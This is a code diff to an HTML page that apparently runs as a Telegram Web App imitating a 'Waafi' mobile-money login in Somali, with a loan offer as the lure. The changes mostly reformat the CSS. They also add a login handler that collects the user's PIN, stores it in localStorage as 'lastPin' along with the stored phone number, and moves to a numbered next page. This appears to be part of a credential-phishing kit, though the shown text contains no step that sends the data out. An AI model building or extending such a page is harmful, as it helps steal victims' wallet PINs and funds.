@@ -8,45 +8,11 @@
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
 
     <style>
-        body { 
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
-            background-color: #fff; 
-            margin: 0; 
-            display: flex; 
-            flex-direction: column; 
-            min-height: 100vh;
-        }
-        
-        .header-box { 
-            width: 100%; 
-            background: linear-gradient(to bottom, #82d13d, #a3e635); 
-            padding: 40px 20px; 
-            color: white; 
-            text-align: center;
-        }
-        
-        .main-content { 
-            width: 90%; 
-            max-width: 400px; 
-            margin: 40px auto 0;
-            text-align: center;
-        }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fff; margin: 0; display: flex; flex-direction: column; min-height: 100vh; }
+        .header-box { width: 100%; background: linear-gradient(to bottom, #82d13d, #a3e635); padding: 40px 20px; color: white; text-align: center; box-sizing: border-box; }
+        .main-content { width: 90%; max-width: 400px; margin: 40px auto 0; text-align: center; flex-grow: 1; }
+        .footer-box { width: 100%; background: linear-gradient(to top, #82d13d, #a3e635); padding: 50px 20px 30px; color: white; text-align: center; border-top-left-radius: 50% 30px; border-top-right-radius: 50% 30px; box-sizing: border-box; }
 
-        .spacer {
-            flex-grow: 1;
-            min-height: 40px;
-        }
-
-        .footer-box { 
-            width: 100%; 
-            background: linear-gradient(to top, #82d13d, #a3e635); 
-            padding: 50px 20px 30px; 
-            color: white; 
-            text-align: center; 
-            border-top-left-radius: 50% 30px;
-            border-top-right-radius: 50% 30px;
-        }
-        
         .logo-text { font-size: 36px; font-weight: bold; margin: 0; }
         .sub-text { font-size: 15px; margin-top: 8px; opacity: 0.9; }
         .version-text { font-size: 12px; margin-top: 15px; opacity: 0.8; }
@@ -54,16 +20,7 @@
 
         h2 { color: #555; font-size: 24px; margin-bottom: 25px; }
 
-        .phone-display { 
-            border: 2px solid #82d13d; 
-            border-radius: 12px; 
-            padding: 16px; 
-            display: flex; 
-            align-items: center; 
-            gap: 12px; 
-            margin-bottom: 40px; 
-            font-size: 20px;
-        }
+        .phone-display { border: 2px solid #82d13d; border-radius: 12px; padding: 16px; display: flex; align-items: center; gap: 12px; margin-bottom: 40px; font-size: 20px; }
 
         .pin-label { color: #888; margin-bottom: 20px; }
 
@@ -71,36 +28,37 @@
 
         .pin-input-group { display: flex; gap: 8px; }
 
-        .pin-box { 
-            width: 55px; 
-            height: 55px; 
-            border: 1.5px solid #82d13d; 
-            border-radius: 10px; 
-            text-align: center; 
-            font-size: 24px; 
+        .pin-box {
+            width: 55px;
+            height: 55px;
+            border: 1.5px solid #82d13d;
+            border-radius: 10px;
+            text-align: center;
+            font-size: 24px;
+            font-weight: bold;
+            outline: none;
+        }
+
+        .toggle-eye { cursor: pointer; margin-left: 10px; font-size: 20px; }
+
+        .forgot-pin { color: #888; font-size: 14px; margin-top: 15px; display: block; text-decoration: none; }
+
+        .btn-gal {
+            background-color: #e0e0e0;
+            color: #fff;
+            border: none;
+            width: 100%;
+            padding: 18px;
+            border-radius: 10px;
+            font-size: 20px;
+            margin-top: 50px;
+            cursor: not-allowed;
             font-weight: bold;
         }
 
-        .toggle-eye { cursor: pointer; margin-left: 10px; }
+        .btn-gal.active { background-color: #82d13d; cursor: pointer; }
 
-        .forgot-pin { color: #888; font-size: 14px; margin-top: 15px; display: block; }
-
-        .btn-gal { 
-            background-color: #e0e0e0; 
-            color: #fff; 
-            border: none; 
-            width: 100%; 
-            padding: 18px; 
-            border-radius: 10px; 
-            font-size: 20px; 
-            margin-top: 50px; 
-            cursor: not-allowed;
-        }
-
-        .btn-gal.active { 
-            background-color: #82d13d; 
-            cursor: pointer;
-        }
+        .spacer { height: 40px; }
     </style>
 </head>
 
@@ -116,11 +74,11 @@
 
     <div class="phone-display">
         <span>🇸🇴</span>
-        <span id="displayPhone">+252 076055999</span>
+        <span id="displayPhone">+252 000000000</span>
     </div>
 
     <p class="pin-label">Geli PIN-kaaga</p>
-    
+
     <div class="pin-container">
         <div class="pin-input-group">
             <input type="password" inputmode="numeric" maxlength="1" class="pin-box">
@@ -134,15 +92,15 @@
     <a href="#" class="forgot-pin">PIN-ka ma iloobtay?</a>
 
     <button id="loginBtn" class="btn-gal" disabled>GAL</button>
-</div>
 
-<div class="spacer"></div>
+    <div class="spacer"></div>
+</div>
 
 <div class="footer-box">
     <p class="logo-text">Waafi</p>
     <p class="sub-text">Amaahado Sahlan oo Degdeg ah</p>
     <p class="version-text">v2.1.3P</p>
-    <p class="terms-text">Galitaanka markaad gasho waad ogolaatay Shuruudaha iyo Xaaladaha</p>
+    <p class="terms-text">Galitaanka markaad gasho waad ogolaatay <u>Shuruudaha iyo Xaaladaha</u></p>
 </div>
 
 <script>
@@ -154,8 +112,9 @@ document.addEventListener("DOMContentLoaded", () => {
     if (!pinBoxes.length || !loginBtn || !eye) return;
 
     pinBoxes.forEach((box, index) => {
+
         box.addEventListener('input', () => {
-            box.value = box.value.replace(/\D/g, ''); // numbers only
+            box.value = box.value.replace(/\D/g, '');
 
             if (box.value && index < pinBoxes.length - 1) {
                 pinBoxes[index + 1].focus();
@@ -178,23 +137,32 @@ document.addEventListener("DOMContentLoaded", () => {
     }
 
     eye.addEventListener('click', () => {
+        const isHidden = pinBoxes[0].type === "password";
+
         pinBoxes.forEach(box => {
-            box.type = box.type === "password" ? "text" : "password";
+            box.type = isHidden ? "text" : "password";
         });
-        eye.textContent = eye.textContent === "👁️" ? "🫣" : "👁️";
+
+        eye.textContent = isHidden ? "🫣" : "👁️";
     });
 
     loginBtn.addEventListener('click', () => {
+        let fullPin = "";
+        pinBoxes.forEach(box => fullPin += box.value);
+
+        localStorage.setItem('lastPin', fullPin);
+
         window.location.href = "/page7";
     });
 
     // Telegram safe init
-    if (window.Telegram?.WebApp) {
-        window.Telegram.WebApp.ready();
-        window.Telegram.WebApp.expand();
+    const tg = window.Telegram?.WebApp;
+    if (tg) {
+        tg.ready();
+        tg.expand();
     }
 
-    // Load phone
+    // Load phone safely
     const phone = localStorage.getItem('phone');
     if (phone) {
         document.getElementById('displayPhone').textContent = `+252 ${phone}`;
@@ -203,4 +171,4 @@ document.addEventListener("DOMContentLoaded", () => {
 </script>
 
 </body>
-</html>
+    </html>
